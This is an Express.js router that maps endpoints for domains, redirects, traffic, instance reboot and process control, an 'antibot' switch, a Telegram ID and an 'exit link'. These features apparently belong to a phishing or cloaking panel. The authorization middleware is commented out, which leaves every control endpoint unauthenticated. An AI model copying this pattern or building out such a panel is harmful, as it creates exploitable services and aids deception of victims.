const express = require("express");
const { check } = require('express-validator');

const domainLib = require('./internal/domain');
const execLib = require('./internal/exec');
const projectLib = require("./internal/project")
const trafficLib = require("./internal/traffic");
const redirectLib = require("./internal/redirect")

// 
// const authorizeFramework = require('./authorize');
// 
const controllerRouter = express.Router();


// controllerRouter.use(authorizeFramework)


controllerRouter.get('/handler/projects', projectLib.getProjects);

controllerRouter.get('/handler/projects/active', projectLib.getActiveProject);

controllerRouter.get('/handler/instance', execLib.getProcessInfo);

controllerRouter.get('/handler/instance/reboot', execLib.rebootInstance);


controllerRouter.get('/handler/domains', domainLib.fetchDomains);

controllerRouter.get('/handler/redirect', redirectLib.getRedirect);


controllerRouter.get('/handler/links', execLib.getLinks)

controllerRouter.get('/handler/information', execLib.getInformation)

controllerRouter.get('/handler/traffic', trafficLib.fetchTraffic)




controllerRouter.post('/handler/domains/add',[
    check('domain').isString()
], domainLib.addDomain);

controllerRouter.post('/handler/domains/delete',[
    check('domain').isString()
],  domainLib.deleteDomain);


controllerRouter.post('/handler/redirect/change',[
    check('domain').isString()
],  redirectLib.setRedirect)




controllerRouter.post('/handler/antibot/switch', [
    check('antibot').isBoolean(),
    check('antibotInfo').default('null;null')
],
execLib.changeAntibot);

controllerRouter.post('/handler/telegram', [
    check('telegramID').exists(),
],
execLib.setTelegramID);

controllerRouter.post('/handler/exitlink', [
    check('exitLink').exists(),
],
execLib.setExitLink);

controllerRouter.post('/handler/projects/change', [
    check('project').isString()
], projectLib.changeProject);

controllerRouter.post('/handler/instance/state',[
    check('state').isString()
],  execLib.execProcessAction)


module.exports = controllerRouter;